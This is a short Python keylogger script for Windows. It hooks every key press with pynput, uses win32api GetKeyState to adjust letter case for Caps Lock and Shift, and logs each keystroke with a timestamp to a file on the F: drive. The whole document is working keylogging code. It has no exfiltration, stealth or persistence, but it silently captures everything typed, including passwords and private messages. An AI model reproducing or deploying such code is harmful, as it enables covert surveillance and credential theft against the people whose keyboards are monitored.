import logging
from win32api import GetKeyState 
from pynput.keyboard import Key, Listener

file_path = r'F:/data/'
logging.basicConfig(filename = (file_path + 'log.txt'), level = logging.DEBUG, format = '%(asctime)s : %(message)s')

def btn_press(key) :
    if (GetKeyState(20) == 1 and (GetKeyState(160) == -127 or GetKeyState(160) == -128)) == True :
        s = str(key)
        logging.info(s.lower())
    elif GetKeyState(20) == 1 :
        s = str(key)
        logging.info(s.upper())
    elif GetKeyState(160) == -127 or GetKeyState(160) == -128 :
        s = str(key)
        logging.info(s.upper())
    else :
        s = str(key)
        logging.info(s.lower())

with Listener(on_press = btn_press) as listen :
    listen.join()